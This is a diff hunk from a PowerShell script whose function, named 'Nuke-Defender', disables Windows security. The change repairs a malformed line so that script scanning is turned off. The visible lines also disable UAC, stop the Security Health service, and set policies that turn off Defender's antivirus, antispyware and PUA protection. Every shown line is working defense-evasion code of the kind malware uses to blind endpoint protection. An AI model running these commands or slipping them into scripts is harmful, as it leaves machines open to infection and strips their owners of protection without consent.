@@ -36,9 +36,10 @@ function Nuke-Defender{
     Set-MpPreference -DisableRestorePoint  $true | Out-Null
     Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan  $true | Out-Null
     Set-MpPreference -DisableScanningNetworkFiles  $true | Out-Null
+    Set-MpPreference -DisableScriptScanning $true | Out-Null
 
     reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v EnableLUA /t REG_DWORD /d 0 > $null
-    reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f > $null   Set-MpPreference -DisableScriptScanning $true | Out-Nul
+    reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f > $null
     reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f > $null
     reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f > $null
     reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f > $null
